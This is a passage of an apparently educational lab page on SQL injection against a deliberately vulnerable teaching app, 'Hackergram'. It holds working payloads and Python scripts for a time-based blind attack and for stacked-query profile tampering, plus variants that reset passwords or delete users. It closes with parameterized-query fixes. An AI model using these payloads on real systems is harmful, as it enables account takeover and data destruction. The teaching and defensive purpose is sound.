+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Password found for </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.100&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;80&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">SERVER</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="n">port</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">SERVER</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Time-based SQLi Attack&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------------------------------</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="n">reset</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">register</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">login</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">time_based_exploit</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</code></pre></div>
+
+**How it works:**
+- Uses `SLEEP(3)` function to delay response when condition is true
+- Measures response time to determine if character is correct
+- If response takes longer than 2.5 seconds, the character was found
+- More reliable than boolean-based in some scenarios
+
+</details>
+
+<h2 id="changing-other-users-profile">Changing other user's profile</h2>
+<p>The following function is used to update the user profile at Hackergram:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Updates user</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">update_user_settings</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">bio</span><span class="p">,</span> <span class="n">photo</span><span class="p">):</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;UPDATE Users&quot;</span>
+    <span class="n">query</span><span class="o">+=</span> <span class="s2">&quot; SET username=&#39;</span><span class="si">%s</span><span class="s2">&#39;, password=&#39;</span><span class="si">%s</span><span class="s2">&#39;, name=&#39;</span><span class="si">%s</span><span class="s2">&#39;, bio=&#39;</span><span class="si">%s</span><span class="s2">&#39;, photo=&#39;</span><span class="si">%s</span><span class="s2">&#39;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">bio</span><span class="p">,</span> <span class="n">photo</span><span class="p">)</span>
+    <span class="n">query</span><span class="o">+=</span> <span class="s2">&quot; WHERE username = &#39;</span><span class="si">%s</span><span class="s2">&#39;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">)</span>
+
+    <span class="n">commit_to_database</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">User</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">bio</span><span class="p">,</span> <span class="n">photo</span><span class="p">)</span>
+</code></pre></div>
+<p>Based on this information, inject an instruction that changes the bio field of the dpr user to "user was pwned".</p>
+<details>
+<summary><strong>💡 Solution</strong></summary>
+
+**Analysis of the vulnerable function:**
+The `update_user_settings` function uses string formatting without proper escaping, making it vulnerable to SQL injection through any of the parameters.
+
+**Method 1: Bio field injection**
+
+1. **In your bio field, enter:**
+   <div class="highlight"><pre><span></span><code>normal bio&#39;; UPDATE Users SET bio=&#39;user was pwned&#39; WHERE username=&#39;dpr&#39;; -- 
+</code></pre></div>
+
+2. **This creates the SQL query:**
+   <div class="highlight"><pre><span></span><code><span class="k">UPDATE</span><span class="w"> </span><span class="n">Users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;mallory&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;eve123&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s1">&#39;Mallory&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">bio</span><span class="o">=</span><span class="s1">&#39;normal bio&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">UPDATE</span><span class="w"> </span><span class="n">Users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">bio</span><span class="o">=</span><span class="s1">&#39;user was pwned&#39;</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;dpr&#39;</span><span class="p">;</span><span class="w"> </span><span class="c1">-- &#39;, photo=&#39;&#39; WHERE username = &#39;mallory&#39;</span>
+</code></pre></div>
+
+**Method 2: Name field injection**
+<div class="highlight"><pre><span></span><code>Mallory&#39;; UPDATE Users SET bio=&#39;user was pwned&#39; WHERE username=&#39;dpr&#39;; -- 
+</code></pre></div>
+
+**Method 3: Python script to automate the attack**
+
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">reset</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/reset&quot;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">register</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s2">&quot;mallory&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s2">&quot;Mallory&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&quot;eve123&quot;</span>
+    <span class="p">}</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/signup&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s2">&quot;mallory&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&quot;eve123&quot;</span>
+    <span class="p">}</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/login&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">exploit_profile</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="c1"># Malicious payload in bio field</span>
+    <span class="n">malicious_bio</span> <span class="o">=</span> <span class="s2">&quot;normal bio&#39;; UPDATE Users SET bio=&#39;user was pwned&#39; WHERE username=&#39;dpr&#39;; -- &quot;</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;mallory&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;Mallory&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;eve123&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;bio&#39;</span><span class="p">:</span> <span class="n">malicious_bio</span><span class="p">,</span>
+        <span class="s1">&#39;photo&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>
+    <span class="p">}</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/settings&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Profile update sent with malicious payload&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">r</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">verify_attack</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="c1"># Check if dpr&#39;s bio was changed</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/users&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s2">&quot;user was pwned&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;✅ Attack successful! DPR&#39;s bio was changed.&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;❌ Attack failed or bio not visible.&quot;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.100&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;80&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">SERVER</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="n">port</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">SERVER</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Profile SQLi Attack&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------------------------------</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="n">reset</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">register</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">login</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">exploit_profile</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">verify_attack</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</code></pre></div>
+
+**Why it works:**
+The vulnerable string formatting allows us to break out of the current UPDATE statement and inject our own SQL commands. The `--` comments out the rest of the original query.
+
+**Alternative payloads:**
+- Change password: `'; UPDATE Users SET password='hacked' WHERE username='dpr'; -- `
+- Change username: `'; UPDATE Users SET username='pwned_dpr' WHERE username='dpr'; -- `
+- Delete user: `'; DELETE FROM Users WHERE username='dpr'; -- `
+
+</details>
+
+<h2 id="countermeasures">Countermeasures</h2>
+<p>In Hackergram, <code>views.py</code> reads form fields and query parameters and passes them into <code>models.py</code>. <strong>The weakness is building SQL with Python’s <code>%</code> formatting</strong>: user input becomes part of the query <em>text</em>. The fix is to keep the SQL shape fixed and pass values as <strong>bound parameters</strong> in <code>cursor.execute(sql, tuple)</code>.</p>
+<p>The examples below mirror the real Hackergram layout: <strong>routes in <code>views.py</code></strong>, <strong>queries in <code>models.py</code></strong> (plus one <code>DELETE</code> built in <code>views.py</code>).</p>
+<h3 id="how-requests-reach-the-database-viewspy">How requests reach the database (<code>views.py</code>)</h3>
+<p>These call sites feed untrusted data into functions that currently format SQL strings:</p>
+<table>
+<thead>
+<tr>
+<th>What you test in the lab</th>
+<th>In <code>views.py</code></th>
+<th>In <code>models.py</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Login bypass</td>
+<td><code>user = models.login(username, password)</code> after reading <code>request.form</code></td>
+<td><code>login()</code></td>
+</tr>
+<tr>
+<td>Search <code>/posts</code>, union/boolean/time-based</td>
+<td><code>posts = models.get_posts(query)</code></td>
+<td><code>get_posts()</code></td>
+</tr>
+<tr>
+<td>Profile <code>UPDATE</code></td>
+<td><code>models.update_user_settings(username, new_name, ...)</code> from <code>/settings</code></td>
+<td><code>update_user_settings()</code></td>
+</tr>
+<tr>
+<td>(Optional) Admin delete user</td>
+<td><code>"DELETE FROM Users WHERE username = '%s'" % user_to_delete</code> then <code>commit_to_database</code></td>
+<td>N/A — fix this line in <code>views.py</code></td>
+</tr>
+</tbody>
+</table>
+<p>You usually <strong>do not</strong> need to change how the route reads <code>request.form</code>; you change how <code>models.py</code> (and that admin <code>DELETE</code>) executes SQL.</p>
+<h3 id="fix-login-stops-authentication-bypass">Fix <code>login</code> (stops authentication bypass)</h3>
+<p><strong>Today in <code>models.py</code> (vulnerable):</strong> quotes in <code>username</code> / <code>password</code> break out of the string.</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM Users&quot;</span>
+    <span class="n">query</span> <span class="o">+=</span> <span class="s2">&quot; WHERE username = &#39;</span><span class="si">%s</span><span class="s2">&#39;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">)</span>
+    <span class="n">query</span> <span class="o">+=</span> <span class="s2">&quot; AND password = &#39;</span><span class="si">%s</span><span class="s2">&#39;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">get_from_database</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+    <span class="o">...</span>
+</code></pre></div>
+<p><strong>Safer:</strong> placeholders <code>%s</code> for the values only.</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM Users WHERE username = </span><span class="si">%s</span><span class="s2"> AND password = </span><span class="si">%s</span><span class="s2">&quot;</span>
+    <span class="n">con</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">con</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
+    <span class="n">mysql</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">con</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+    <span class="n">con</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">User</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+    <span class="k">return</span> <span class="kc">None</span>
+</code></pre></div>
+<p>Payloads like <code>admin' AND 1=1 --</code> are then treated as the <strong>literal</strong> username, not SQL syntax.</p>
+<h3 id="fix-get_posts-stops-search-union-inference-tricks-on-posts">Fix <code>get_posts</code> (stops search / <code>UNION</code> / inference tricks on <code>/posts</code>)</h3>
+<p><strong>Today in <code>models.py</code> (vulnerable):</strong> the search term is embedded inside <code>LIKE '%%%s%%'</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">get_posts</span><span class="p">(</span><span class="n">search</span><span class="p">):</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;SELECT Posts.id, Users.username, ...&quot;</span>
+    <span class="n">query</span> <span class="o">+=</span> <span class="s2">&quot; WHERE Posts.content LIKE &#39;</span><span class="si">%%%s%%</span><span class="s2">&#39;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">search</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">get_from_database</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+    <span class="o">...</span>
+</code></pre></div>
+<p><strong>Safer:</strong> build the <code>%...%</code> pattern in Python; bind it as <strong>one</strong> value.</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">get_posts</span><span class="p">(</span><span class="n">search</span><span class="p">):</span>
+    <span class="n">sql</span> <span class="o">=</span> <span class="p">(</span>
+        <span class="s2">&quot;SELECT Posts.id, Users.username, Users.name, Users.photo, Posts.content, Posts.posted_at &quot;</span>
+        <span class="s2">&quot;FROM Posts INNER JOIN Users ON Posts.author = Users.username &quot;</span>
+        <span class="s2">&quot;WHERE Posts.content LIKE </span><span class="si">%s</span><span class="s2">&quot;</span>
+    <span class="p">)</span>
+    <span class="n">pattern</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;%</span><span class="si">{</span><span class="n">search</span><span class="si">}</span><span class="s2">%&quot;</span>
+    <span class="n">con</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">con</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">(</span><span class="n">pattern</span><span class="p">,))</span>
+    <span class="n">mysql</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">con</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+    <span class="n">con</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="o">...</span>
+</code></pre></div>
+<p>Apply the same pattern anywhere else you see <code>LIKE '%%%s%%'</code> (for example <code>get_users</code>, <code>get_friends</code>).</p>
+<h3 id="fix-update_user_settings-stops-piggybacked-update-in-profile-fields">Fix <code>update_user_settings</code> (stops piggybacked <code>UPDATE</code> in profile fields)</h3>
+<p><strong>Today in <code>models.py</code> (vulnerable):</strong> all fields are pasted into the statement, including <code>bio</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">update_user_settings</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">bio</span><span class="p">,</span> <span class="n">photo</span><span class="p">):</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;UPDATE Users&quot;</span>
+    <span class="n">query</span> <span class="o">+=</span> <span class="s2">&quot; SET username=&#39;</span><span class="si">%s</span><span class="s2">&#39;, password=&#39;</span><span class="si">%s</span><span class="s2">&#39;, name=&#39;</span><span class="si">%s</span><span class="s2">&#39;, bio=&#39;</span><span class="si">%s</span><span class="s2">&#39;, photo=&#39;</span><span class="si">%s</span><span class="s2">&#39;&quot;</span> <span class="o">%</span> <span class="p">(</span>
+        <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">bio</span><span class="p">,</span> <span class="n">photo</span><span class="p">)</span>
+    <span class="n">query</span> <span class="o">+=</span> <span class="s2">&quot; WHERE username = &#39;</span><span class="si">%s</span><span class="s2">&#39;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">)</span>
+    <span class="n">commit_to_database</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+</code></pre></div>
+<p><strong>Safer:</strong></p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">update_user_settings</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">bio</span><span class="p">,</span> <span class="n">photo</span><span class="p">):</span>
+    <span class="n">sql</span> <span class="o">=</span> <span class="p">(</span>
+        <span class="s2">&quot;UPDATE Users SET username=</span><span class="si">%s</span><span class="s2">, password=</span><span class="si">%s</span><span class="s2">, name=</span><span class="si">%s</span><span class="s2">, bio=</span><span class="si">%s</span><span class="s2">, photo=</span><span class="si">%s</span><span class="s2"> &quot;</span>
+        <span class="s2">&quot;WHERE username=</span><span class="si">%s</span><span class="s2">&quot;</span>
+    <span class="p">)</span>
+    <span class="n">con</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">con</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">bio</span><span class="p">,</span> <span class="n">photo</span><span class="p">,</span> <span class="n">username</span><span class="p">))</span>
+    <span class="n">mysql</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+    <span class="n">con</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="fix-admin-delete-user-viewspy">Fix admin delete user (<code>views.py</code>)</h3>
+<p><strong>Today (vulnerable fragment):</strong></p>
+<div class="highlight"><pre><span></span><code><span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;DELETE FROM Users WHERE username = &#39;</span><span class="si">%s</span><span class="s2">&#39;&quot;</span> <span class="o">%</span> <span class="n">user_to_delete</span>
+<span class="n">models</span><span class="o">.</span><span class="n">commit_to_database</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+</code></pre></div>
+<p><strong>Safer:</strong> parameterized delete (example — use the same <code>mysql</code> handle your app already uses):</p>
+<div class="highlight"><pre><span></span><code><span class="n">con</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+<span class="n">con</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;DELETE FROM Users WHERE username = </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">user_to_delete</span><span class="p">,))</span>
+<span class="n">mysql</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+<span class="n">con</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="still-use-least-privilege-and-safer-errors">Still use least privilege and safer errors</h3>
+<ul>
+<li>Give the app DB account only the rights it needs (no <code>DROP</code> / file read), so piggybacked statements have less impact if something is missed.</li>
+<li>The <code>error()</code> helper in <code>views.py</code> can expose exception text to the browser, which helps <strong>error-based</strong> SQLi. Log details on the server; show users a <strong>generic</strong> message.</li>
+</ul>
+<p><strong>Takeaway:</strong> parameterized <code>execute(sql, params)</code> in <code>models.py</code> (and for the admin <code>DELETE</code> in <code>views.py</code>) matches how Hackergram is structured and closes the same holes you exploit in the exercises.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.sections", "content.code.copy", "navigation.indexes", "navigation.expand", "navigation.tabs.sticky"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
